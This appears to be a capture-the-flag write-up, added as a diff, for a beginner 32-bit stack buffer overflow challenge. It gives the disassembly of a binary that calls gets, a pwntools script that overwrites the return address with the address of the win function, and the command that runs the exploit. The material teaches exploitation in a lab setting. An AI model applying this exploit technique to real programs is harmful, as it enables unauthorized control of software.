@@ -1,0 +1,40 @@
+First we make the binary executable nad get the assembler dump of program 
+$ obdjdump -d pwn3-controleip
+080483f4 <win>:
+ 80483f4:	55                   	push   %ebp
+ 80483f5:	89 e5                	mov    %esp,%ebp
+ 80483f7:	83 ec 18             	sub    $0x18,%esp
+ 80483fa:	c7 04 24 e0 84 04 08 	movl   $0x80484e0,(%esp)
+ 8048401:	e8 26 ff ff ff       	call   804832c <puts@plt>
+ 8048406:	c9                   	leave  
+ 8048407:	c3                   	ret    
+
+08048408 <main>:
+ 8048408:	55                   	push   %ebp
+ 8048409:	89 e5                	mov    %esp,%ebp
+ 804840b:	83 e4 f0             	and    $0xfffffff0,%esp
+ 804840e:	83 ec 50             	sub    $0x50,%esp
+ 8048411:	8d 44 24 10          	lea    0x10(%esp),%eax
+ 8048415:	89 04 24             	mov    %eax,(%esp)
+ 8048418:	e8 ef fe ff ff       	call   804830c <gets@plt>
+ 804841d:	c9                   	leave  
+ 804841e:	c3                   	ret    
+ 804841f:	90                   	nop
+
+As the name suggests we have to make use of bufferoverflow vulnerability to control eip and set the addrress of win function 
+in eip register 
+so first we find offset using gdb nad then simply attach the address of win function at it's last to move the control to 
+win function instead of exiting here is the python script-
+
+from pwn import *
+
+payload="AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
+win_addr=p32(0x080483f4)
+
+payload +=win_addr
+
+print(payload)
+
+Now we the ouput of this script is payload of given binary so we use
+$ python script.py | ./pwn3-controleip
+and we get the ouput "code flow successfully changed."
